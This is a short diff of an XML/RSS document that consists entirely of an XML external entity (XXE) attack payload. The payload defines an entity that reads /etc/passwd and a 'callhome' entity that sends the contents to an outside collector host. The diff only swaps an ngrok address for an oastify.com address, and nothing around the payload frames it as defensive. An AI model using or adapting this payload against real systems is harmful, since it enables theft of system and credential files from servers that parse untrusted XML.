@@ -2,7 +2,7 @@
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
-<!ENTITY callhome SYSTEM "773f-2405-201-684a-3810-ec24-258c-3827-57bf.ngrok-free.app/?%xxe;">
+<!ENTITY callhome SYSTEM "if1jchu3y5uzyl85l7hvah8vhmndb3zs.oastify.com/?%xxe;">
 ]
 >
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
